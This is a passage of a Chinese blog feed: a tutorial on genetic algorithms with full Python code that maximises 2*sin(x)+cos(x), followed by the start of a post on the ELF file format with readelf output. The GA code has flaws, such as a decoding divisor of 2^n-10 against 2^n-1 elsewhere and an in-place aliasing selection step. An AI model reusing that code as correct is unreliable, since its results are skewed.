<p>适应度(fitness)：度量某个物种对于生存环境的适应程度。</p>
<p>选择(selection)：<strong>以一定的概率</strong>从种群中选择若干个个体。一般，选择过程是一种<strong>基于适应度</strong>的优胜劣汰的过程。</p>
<p>复制(reproduction)：细胞分裂时，遗传物质DNA通过复制而转移到新产生的细胞中，新细胞就继承了旧细胞的基因。</p>
<p>交叉(crossover)：两个染色体的某一相同位置处DNA被切断，前后两串分别交叉组合形成两个新的染色体。也称基因重组或杂交；</p>
<p>变异(mutation)：复制时可能（很小的概率）产生某些复制差错，变异产生新的染色体，表现出新的性状。</p>
<p>编码(coding)：DNA中遗传信息在一个长链上按一定的模式排列。遗传编码可看作从表现型到基因型的映射。</p>
<p>解码(decoding)：基因型到表现型的映射。</p>
<p>个体（individual）：指染色体带有特征的实体；</p>
<p>种群（population）：个体的集合，该集合内个体数称为种群的大小。</p>
<h3 id="编码方式">编码方式</h3>
<p>二进制编码和浮点数编码基因型</p>
<p>人的基因型是46条染色体所描述的却能解码成一个眼，耳，口，鼻等特征各不相同的活生生的人。</p>
<p>编码的前提是了解需要编码的个体的特征，尤其是与问题相关的特征。</p>
<h3 id="物竞天择">物竞天择</h3>
<p>物竞体现在适应度函数上。</p>
<p>天择体现在适应度高的个体以较大概率繁殖后代，在种群中产生更多的基因留存。轮盘赌（Roulette Wheel Selection）选择法即是计算适应度函数输入结果占比来确定这个概率。</p>
<h3 id="基因交叉重组和变异">基因交叉(重组)和变异</h3>
<h4 id="重组交叉">重组/交叉</h4>
<p>二进制编码，其实就是简单对基因序列进行交换、移位、翻转等操作。</p>
<p>浮点数编码则可能产生介于中间的值，或者其他。</p>
<h4 id="变异突变">变异/突变</h4>
<p>二进制编码体现在某个或多个位以一定概率取反。</p>
<p>浮点数编码体现在随机增加或减小一个步长，步长开始大，后面小，动态改变步长，尽可能加快收敛，同时保证能收敛到精确的点上。</p>
<center>
<image src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210919095153597-434719797.jpg"/>
</center>
<h2 id="题目实践">题目实践</h2>
<h3 id="问题">问题</h3>
<p><span class="math inline">\(f(x)=2*\sin{(x)}+\cos{(x)}\)</span>的最大值</p>
<h3 id="求解完整代码">求解完整代码</h3>
<p>代码来自参考中,比较详尽，可以直接运行，可能要去掉第3和7行。</p>
<p>轮盘赌部分没看懂，抽奖的方法，转盘转。</p>
<h4 id="函数作用表">函数作用表</h4>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">species_origin</td>
<td style="text-align: center;">返回个体数*基因数的矩阵population</td>
</tr>
<tr class="even">
<td style="text-align: center;">translation</td>
<td style="text-align: center;">输入population，得到每个个体基因的<strong>十进制数</strong>的1*population_size的矩阵</td>
</tr>
<tr class="odd">
<td style="text-align: center;">function</td>
<td style="text-align: center;">输入population，得到每个个体的适应度<span class="math inline">\(f(x)\)</span>一维数组</td>
</tr>
<tr class="even">
<td style="text-align: center;">fitness</td>
<td style="text-align: center;">对function输入结果进行过滤，小于0的变为0（没看懂，可能是因为要计算适应度的和）</td>
</tr>
<tr class="odd">
<td style="text-align: center;">cumsum</td>
<td style="text-align: center;">输入fitness结果，输出各适应度所占的区间，依次增大，最后一个为1</td>
</tr>
<tr class="even">
<td style="text-align: center;">selection</td>
<td style="text-align: center;">输入population和fitness,根据轮盘赌算法输出新的种群</td>
</tr>
<tr class="odd">
<td style="text-align: center;">crossover</td>
<td style="text-align: center;">输入population,基因的交叉操作，每相邻两个个体之间交换基因</td>
</tr>
<tr class="even">
<td style="text-align: center;">mutation</td>
<td style="text-align: center;">变异操作，根据pm，在某一位置上取反</td>
</tr>
<tr class="odd">
<td style="text-align: center;">b2d</td>
<td style="text-align: center;">取最大值函数</td>
</tr>
</tbody>
</table>
<h4 id="完整代码">完整代码</h4>
<details>
<summary>
点击查看代码
</summary>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#目标求解2*sin(x)+cos(x)最大值</span></span><br><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">%matplotlib inline</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GA</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="comment">#初始化种群 生成chromosome_length大小的population_size个个体的种群</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,population_size,chromosome_length,max_value,pc,pm</span>):</span></span><br><span class="line"></span><br><span class="line">        self.population_size=population_size</span><br><span class="line">        self.choromosome_length=chromosome_length</span><br><span class="line">        <span class="comment"># self.population=[[]]</span></span><br><span class="line">        self.max_value=max_value</span><br><span class="line">        self.pc=pc</span><br><span class="line">        self.pm=pm</span><br><span class="line">        <span class="comment"># self.fitness_value=[]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">species_origin</span>(<span class="params">self</span>):</span></span><br><span class="line">        population=[[]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.population_size):</span><br><span class="line"></span><br><span class="line">            temporary=[]</span><br><span class="line">        <span class="comment">#染色体暂存器</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.choromosome_length):</span><br><span class="line"></span><br><span class="line">                temporary.append(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">            <span class="comment">#随机产生一个染色体,由二进制数组成</span></span><br><span class="line"></span><br><span class="line">            population.append(temporary)</span><br><span class="line">            <span class="comment">#将染色体添加到种群中</span></span><br><span class="line">        <span class="keyword">return</span> population[<span class="number">1</span>:]</span><br><span class="line">            <span class="comment"># 将种群返回，种群是个二维数组，个体和染色体两维</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#从二进制到十进制</span></span><br><span class="line">    <span class="comment">#编码  input:种群,染色体长度 编码过程就是将多元函数转化成一元函数的过程</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">translation</span>(<span class="params">self,population</span>):</span></span><br><span class="line"></span><br><span class="line">        temporary=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(population)):</span><br><span class="line">            total=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.choromosome_length):</span><br><span class="line">                total+=population[i][j]*(math.<span class="built_in">pow</span>(<span class="number">2</span>,j))</span><br><span class="line">            <span class="comment">#从第一个基因开始，每位对2求幂，再求和</span></span><br><span class="line">            <span class="comment"># 如：0101 转成十进制为：1 * 20 + 0 * 21 + 1 * 22 + 0 * 23 = 1 + 0 + 4 + 0 = 5</span></span><br><span class="line">            temporary.append(total)</span><br><span class="line">        <span class="comment">#一个染色体编码完成，由一个二进制数编码为一个十进制数</span></span><br><span class="line">        <span class="keyword">return</span> temporary</span><br><span class="line">   <span class="comment"># 返回种群中所有个体编码完成后的十进制数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#from protein to function,according to its functoin value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a protein realize its function according its structure</span></span><br><span class="line"><span class="comment"># 目标函数相当于环境 对染色体进行筛选，这里是2*sin(x)+math.cos(x)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">self,population</span>):</span></span><br><span class="line">        temporary=[]</span><br><span class="line">        function1=[]</span><br><span class="line">        temporary=self.translation(population)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temporary)):</span><br><span class="line">            x=temporary[i]*self.max_value/(math.<span class="built_in">pow</span>(<span class="number">2</span>,self.choromosome_length)-<span class="number">10</span>)</span><br><span class="line">            function1.append(<span class="number">2</span>*math.sin(x)+math.cos(x))</span><br><span class="line"></span><br><span class="line">         <span class="comment">#这里将sin(x)作为目标函数</span></span><br><span class="line">        <span class="keyword">return</span> function1</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义适应度</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fitness</span>(<span class="params">self,function1</span>):</span></span><br><span class="line"></span><br><span class="line">        fitness_value=[]</span><br><span class="line"></span><br><span class="line">        num=<span class="built_in">len</span>(function1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(function1[i]&gt;<span class="number">0</span>):</span><br><span class="line">                temporary=function1[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temporary=<span class="number">0.0</span></span><br><span class="line">        <span class="comment"># 如果适应度小于0,则定为0</span></span><br><span class="line"></span><br><span class="line">            fitness_value.append(temporary)</span><br><span class="line">        <span class="comment">#将适应度添加到列表中</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fitness_value</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算适应度和</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params">self,fitness_value</span>):</span></span><br><span class="line">        total=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fitness_value)):</span><br><span class="line">            total+=fitness_value[i]</span><br><span class="line">        <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算适应度斐伯纳且列表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cumsum</span>(<span class="params">self,fitness1</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fitness1)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># range(start,stop,[step])</span></span><br><span class="line">        <span class="comment"># 倒计数</span></span><br><span class="line">            total=<span class="number">0</span></span><br><span class="line">            j=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(j&lt;=i):</span><br><span class="line">                 total+=fitness1[j]</span><br><span class="line">                 j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            fitness1[i]=total</span><br><span class="line">            fitness1[<span class="built_in">len</span>(fitness1)-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.选择种群中个体适应度最大的个体</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selection</span>(<span class="params">self,population,fitness_value</span>):</span></span><br><span class="line">        new_fitness=[]</span><br><span class="line">    <span class="comment">#单个公式暂存器</span></span><br><span class="line">        total_fitness=self.<span class="built_in">sum</span>(fitness_value)</span><br><span class="line">    <span class="comment">#将所有的适应度求和</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fitness_value)):</span><br><span class="line">            new_fitness.append(fitness_value[i]/total_fitness)</span><br><span class="line">    <span class="comment">#将所有个体的适应度正则化</span></span><br><span class="line">        self.cumsum(new_fitness)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">        ms=[]</span><br><span class="line">    <span class="comment">#存活的种群</span></span><br><span class="line">        population_length=pop_len=<span class="built_in">len</span>(population)</span><br><span class="line">    <span class="comment">#求出种群长度</span></span><br><span class="line">    <span class="comment">#根据随机数确定哪几个能存活</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pop_len):</span><br><span class="line">            ms.append(random.random())</span><br><span class="line">    <span class="comment"># 产生种群个数的随机值</span></span><br><span class="line">    <span class="comment"># ms.sort()</span></span><br><span class="line">    <span class="comment"># 存活的种群排序</span></span><br><span class="line">        fitin=<span class="number">0</span></span><br><span class="line">        newin=<span class="number">0</span></span><br><span class="line">        new_population=new_pop=population</span><br><span class="line"></span><br><span class="line">    <span class="comment">#轮盘赌方式</span></span><br><span class="line">        <span class="keyword">while</span> newin&lt;pop_len:</span><br><span class="line">              <span class="keyword">if</span>(ms[newin]&lt;new_fitness[fitin]):</span><br><span class="line">                 new_pop[newin]=population[fitin]</span><br><span class="line">                 newin+=<span class="number">1</span></span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                 fitin+=<span class="number">1</span></span><br><span class="line">        population=new_pop</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.交叉操作</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crossover</span>(<span class="params">self,population</span>):</span></span><br><span class="line"><span class="comment">#pc是概率阈值，选择单点交叉还是多点交叉，生成新的交叉个体，这里没用</span></span><br><span class="line">        pop_len=<span class="built_in">len</span>(population)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pop_len-<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(random.random()&lt;self.pc):</span><br><span class="line"></span><br><span class="line">               cpoint=random.randint(<span class="number">0</span>,<span class="built_in">len</span>(population[<span class="number">0</span>]))</span><br><span class="line">           <span class="comment">#在种群个数内随机生成单点交叉点</span></span><br><span class="line">               temporary1=[]</span><br><span class="line">               temporary2=[]</span><br><span class="line"></span><br><span class="line">               temporary1.extend(population[i][<span class="number">0</span>:cpoint])</span><br><span class="line">               temporary1.extend(population[i+<span class="number">1</span>][cpoint:<span class="built_in">len</span>(population[i])])</span><br><span class="line">           <span class="comment">#将tmporary1作为暂存器，暂时存放第i个染色体中的前0到cpoint个基因，</span></span><br><span class="line">           <span class="comment">#然后再把第i+1个染色体中的后cpoint到第i个染色体中的基因个数，补充到temporary2后面</span></span><br><span class="line"></span><br><span class="line">               temporary2.extend(population[i+<span class="number">1</span>][<span class="number">0</span>:cpoint])</span><br><span class="line">               temporary2.extend(population[i][cpoint:<span class="built_in">len</span>(population[i])])</span><br><span class="line">        <span class="comment"># 将tmporary2作为暂存器，暂时存放第i+1个染色体中的前0到cpoint个基因，</span></span><br><span class="line">        <span class="comment"># 然后再把第i个染色体中的后cpoint到第i个染色体中的基因个数，补充到temporary2后面</span></span><br><span class="line">               population[i]=temporary1</span><br><span class="line">               population[i+<span class="number">1</span>]=temporary2</span><br><span class="line">        <span class="comment"># 第i个染色体和第i+1个染色体基因重组/交叉完成</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mutation</span>(<span class="params">self,population</span>):</span></span><br><span class="line">     <span class="comment"># pm是概率阈值</span></span><br><span class="line">         px=<span class="built_in">len</span>(population)</span><br><span class="line">    <span class="comment"># 求出种群中所有种群/个体的个数</span></span><br><span class="line">         py=<span class="built_in">len</span>(population[<span class="number">0</span>])</span><br><span class="line">    <span class="comment"># 染色体/个体基因的个数</span></span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(px):</span><br><span class="line">             <span class="keyword">if</span>(random.random()&lt;self.pm):</span><br><span class="line">                mpoint=random.randint(<span class="number">0</span>,py-<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">                <span class="keyword">if</span>(population[i][mpoint]==<span class="number">1</span>):</span><br><span class="line">               <span class="comment">#将mpoint个基因进行单点随机变异，变为0或者1</span></span><br><span class="line">                   population[i][mpoint]=<span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                   population[i][mpoint]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#transform the binary to decimalism</span></span><br><span class="line"><span class="comment"># 将每一个染色体都转化成十进制 max_value,再筛去过大的值</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">b2d</span>(<span class="params">self,best_individual</span>):</span></span><br><span class="line">        total=<span class="number">0</span></span><br><span class="line">        b=<span class="built_in">len</span>(best_individual)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">            total=total+best_individual[i]*math.<span class="built_in">pow</span>(<span class="number">2</span>,i)</span><br><span class="line"></span><br><span class="line">        total=total*self.max_value/(math.<span class="built_in">pow</span>(<span class="number">2</span>,self.choromosome_length)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="comment">#寻找最好的适应度和个体</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">best</span>(<span class="params">self,population,fitness_value</span>):</span></span><br><span class="line"></span><br><span class="line">        px=<span class="built_in">len</span>(population)</span><br><span class="line">        bestindividual=[]</span><br><span class="line">        bestfitness=fitness_value[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(fitness_value)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,px):</span><br><span class="line">   <span class="comment"># 循环找出最大的适应度，适应度最大的也就是最好的个体</span></span><br><span class="line">            <span class="keyword">if</span>(fitness_value[i]&gt;bestfitness):</span><br><span class="line"></span><br><span class="line">               bestfitness=fitness_value[i]</span><br><span class="line">               bestindividual=population[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [bestindividual,bestfitness]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">plot</span>(<span class="params">self, results</span>):</span></span><br><span class="line">        X = []</span><br><span class="line">        Y = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">            X.append(i)</span><br><span class="line">            Y.append(results[i][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        plt.plot(X, Y)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        results = [[]]</span><br><span class="line">        fitness_value = []</span><br><span class="line">        fitmean = []</span><br><span class="line"></span><br><span class="line">        population = pop = self.species_origin()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">            function_value = self.function(population)</span><br><span class="line">            <span class="comment"># print(&#x27;fit funtion_value:&#x27;,function_value)</span></span><br><span class="line">            fitness_value = self.fitness(function_value)</span><br><span class="line">            <span class="comment"># print(&#x27;fitness_value:&#x27;,fitness_value)</span></span><br><span class="line"></span><br><span class="line">            best_individual, best_fitness = self.best(population,fitness_value)</span><br><span class="line">            results.append([best_fitness, self.b2d(best_individual)])</span><br><span class="line">        <span class="comment"># 将最好的个体和最好的适应度保存，并将最好的个体转成十进制,适应度函数</span></span><br><span class="line">            self.selection(population,fitness_value)</span><br><span class="line">            self.crossover(population)</span><br><span class="line">            self.mutation(population)</span><br><span class="line">        results = results[<span class="number">1</span>:]</span><br><span class="line">        results.sort()</span><br><span class="line">        self.plot(results)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   population_size=<span class="number">400</span><span class="comment">#种群大小</span></span><br><span class="line">   max_value=<span class="number">10</span><span class="comment">#x的最大值，x是表现型，由基因构造的比率乘以最大值得到，其他情况下是乘以区间长度加上最小值</span></span><br><span class="line">   chromosome_length=<span class="number">20</span><span class="comment">#基因的位数，采用二进制编码</span></span><br><span class="line">   pc=<span class="number">0.6</span><span class="comment">#交叉中的概率阈值，但是这个代码貌似并没有用</span></span><br><span class="line">   pm=<span class="number">0.01</span><span class="comment">#突变的概率，突变时使用random生成一个概率和它比较</span></span><br><span class="line">   ga=GA(population_size,chromosome_length,max_value,pc,pm)</span><br><span class="line">   ga.main()</span><br></pre></td></tr></table></figure>
</details>
<h3 id="运行结果">运行结果</h3>
<p>500次每次的最大<span class="math inline">\(f(x)\)</span>,可以清除看到每次都在上升，但是貌似并没有标注是哪个<span class="math inline">\(x\)</span>生成的。</p>
<center>
<image src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210919112345724-1119869064.png"/>
</center>
<h2 id="轮盘赌算法">轮盘赌算法</h2>
<p>因为前面的轮盘赌算法没看懂，又去找博客看了看。</p>
<p>个人理解：假设有一个转盘和指针，指针转动一圈停留在哪个区间就是哪个。指针转动可以使用随机函数random.random模拟，随机落到0-1的区间，落在哪个区间对应的方案就是哪个。构造区间我们使用</p>
<pre><code>                                                                            $$q_i=\sum_&#123;j=0&#125;^&#123;i&#125;P(x_j)$$</code></pre>
<p><span class="math inline">\(P(x_j)\)</span>是<span class="math inline">\(x_j\)</span>被选中的概率，依次生成<span class="math inline">\(0,q_1,q_2,q_3,\cdots,q_n，1\)</span>，随机一个概率<span class="math inline">\(r\)</span>，落在哪个区间就是哪个。例如<span class="math inline">\(q_2&lt;r&lt;q_3\)</span>,则选中了<span class="math inline">\(x_3\)</span></p>
<center>
<image src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210919125024238-93986478.png" style="width:50%;height:50%;"/>
</center>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/112788663">用Python实现遗传算法 - 知乎 (zhihu.com)</a>理解详尽，推荐</p>
<p><a href="https://blog.csdn.net/pymqq/article/details/51375522">(10条消息) 轮盘赌算法_pymqq的专栏-CSDN博客</a></p>
]]></content>
      <categories>
        <category>数学模型</category>
      </categories>
      <tags>
        <tag>优化算法</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF文件解析</title>
    <url>/2021/11/12/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90.html</url>
    <content><![CDATA[<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202206/2348945-20220630093618000-396277112.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>ELF可执行可链接格式，最初由UNIX系统实验室作为应用程序二进制接口的一部分制定，是COFF(common file format)的变种，相关定义在/usr/include/elf.h文件中。</p>
<span id="more"></span>
<meta name="referrer" content="no-referrer"/>
<h2 id="elf-文件类型">ELF 文件类型</h2>
<p>说明：linux和windows识别文件格式不同，linux是根据文件头的字段，windows直接根据文件名后缀。</p>
<p>主要分为三类：</p>
<ul>
<li>可执行文件executable file：经过链接、可执行的目标文件，也被称为程序。</li>
<li>可重定位文（relocatable file）：由源文件编译但是没有链接的目标文件，通常以.o作为拓展名。用于与其他文件链接构成可执行文件或动态链接库，通常是一段位置独立的代码(Position Independent code, PIC)</li>
<li>共享目标文件（shared object file）：动态链接库文件，用于在链接的过程中与其他动态链接库或可重定位文件一起构建可执行文件。</li>
</ul>
<p>除此之外，还存在 <strong>核心转储文件(core dump file)</strong>作为进程以外终止时地址空间的转储，也是ELF文件的一种。可以使用gdb工具读取辅助调试和查找程序崩溃的原因。</p>
<p>在内核中的定义（/include/uapi/linux/elf.h）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_REL     1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_EXEC   2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_DYN    3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  ET_CORE  4</span></span><br></pre></td></tr></table></figure>
<h2 id="elf文件格式">ELF文件格式</h2>
<h3 id="总体布局">总体布局</h3>
<p>ELF文件格式提供了两种视图，分别是链接视图和执行视图。<strong>链接视图是以节（section）为单位</strong>，<strong>执行视图是以段（segment）为单位</strong>。接视图就是在链接时用到的视图，而执行视图则是在执行时用到的视图。</p>
<p><img src="/images/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/2348945-20211111190022555-192049174.jpg" /></p>
<p>可以使用<code>readelf -l hello</code>查看一个链接后的elf可执行文件，Section to Segment 的映射关系</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Elf 文件类型为 EXEC (可执行文件)</span><br><span class="line">Entry point 0x401cc0</span><br><span class="line">There are 8 program headers, starting at offset 64</span><br><span class="line"></span><br><span class="line">程序头：</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000</span><br><span class="line">                 0x0000000000000488 0x0000000000000488  R      0x1000</span><br><span class="line">  LOAD           0x0000000000001000 0x0000000000401000 0x0000000000401000</span><br><span class="line">                 0x000000000007fab1 0x000000000007fab1  R E    0x1000</span><br><span class="line">  LOAD           0x0000000000081000 0x0000000000481000 0x0000000000481000</span><br><span class="line">                 0x0000000000026e0b 0x0000000000026e0b  R      0x1000</span><br><span class="line">  LOAD           0x00000000000a8000 0x00000000004a9000 0x00000000004a9000</span><br><span class="line">                 0x00000000000052f0 0x0000000000006b20  RW     0x1000</span><br><span class="line">  NOTE           0x0000000000000200 0x0000000000400200 0x0000000000400200</span><br><span class="line">                 0x0000000000000044 0x0000000000000044  R      0x4</span><br><span class="line">  TLS            0x00000000000a8000 0x00000000004a9000 0x00000000004a9000</span><br><span class="line">                 0x0000000000000020 0x0000000000000060  R      0x8</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     0x10</span><br><span class="line">  GNU_RELRO      0x00000000000a8000 0x00000000004a9000 0x00000000004a9000</span><br><span class="line">                 0x0000000000003000 0x0000000000003000  R      0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  段节...</span><br><span class="line">   00     .note.gnu.build-id .note.ABI-tag .rela.plt </span><br><span class="line">   01     .init .plt .text __libc_freeres_fn .fini </span><br><span class="line">   02     .rodata .eh_frame .gcc_except_table </span><br><span class="line">   03     .tdata .init_array .fini_array .data.rel.ro .got .got.plt .data __libc_subfreeres __libc_IO_vtables __libc_atexit .bss __libc_freeres_ptrs </span><br><span class="line">   04     .note.gnu.build-id .note.ABI-tag </span><br><span class="line">   05     .tdata .tbss </span><br><span class="line">   06     </span><br><span class="line">   07     .tdata .init_array .fini_array .data.rel.ro .got </span><br></pre></td></tr></table></figure>
<p>下面的段序号和上面程序头里的段一一对应。</p>
<h3 id="文件结构">文件结构</h3>
<p>主要从链接的角度看elf文件。</p>
<h4 id="elf头">elf头</h4>
<p>描述文件的一些基本信息，文件头部存在魔术字符7f 45 4c 46即字符串"\177ELF"，当文件被映射到内存时可以通过该字符串查找位置，dump内存。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -h relocfile //查看文件头信息</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELF 头：</span><br><span class="line">  Magic：  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF64</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              REL (可重定位文件)</span><br><span class="line">  系统架构:                          Advanced Micro Devices X86-64</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：              0x0</span><br><span class="line">  程序头起点：              0 (bytes into file)</span><br><span class="line">  Start of section headers:          816 (bytes into file)</span><br><span class="line">  标志：             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 12</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_hdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	  <span class="keyword">unsigned</span> <span class="keyword">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line">	  Elf32_Half	e_type;			    <span class="comment">/* Object file type */</span></span><br><span class="line">	  Elf32_Half	e_machine;		    <span class="comment">/* Architecture */</span></span><br><span class="line">	  Elf32_Word	e_version;		    <span class="comment">/* Object file version */</span></span><br><span class="line">	  Elf32_Addr	e_entry;		    <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">	  Elf32_Off	e_phoff;		        <span class="comment">/* Program header table file offset */</span></span><br><span class="line">	  Elf32_Off	e_shoff;		        <span class="comment">/* Section header table file offset */</span></span><br><span class="line">	  Elf32_Word	e_flags;		    <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">	  Elf32_Half	e_ehsize;		    <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">	  Elf32_Half	e_phentsize;		<span class="comment">/* Program header table entry size */</span></span><br><span class="line">	  Elf32_Half	e_phnum;		    <span class="comment">/* Program header table entry count */</span></span><br><span class="line">	  Elf32_Half	e_shentsize;		<span class="comment">/* Section header table entry size */</span></span><br><span class="line">	  Elf32_Half	e_shnum;		    <span class="comment">/* Section header table entry count */</span></span><br><span class="line">	  